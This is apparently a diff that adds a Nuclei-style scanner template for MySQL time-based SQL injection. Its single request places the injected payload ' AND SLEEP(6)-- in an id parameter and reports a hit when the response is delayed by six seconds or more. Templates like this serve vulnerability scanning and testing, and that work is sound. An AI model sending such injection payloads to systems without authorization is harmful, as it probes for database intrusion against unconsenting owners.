@@ -1,0 +1,12 @@
+id: K70n0s510-sqli-time-mysql
+info:
+  name: MySQL Time-Based SQLi
+  author: K70n0s510
+  severity: critical
+  tags: sqli,mysql
+http:
+  - method: GET
+    path: ["{{BaseURL}}/?id=1' AND SLEEP(6)--"]
+    matchers:
+      - type: dsl
+        dsl: ["duration>=6"]
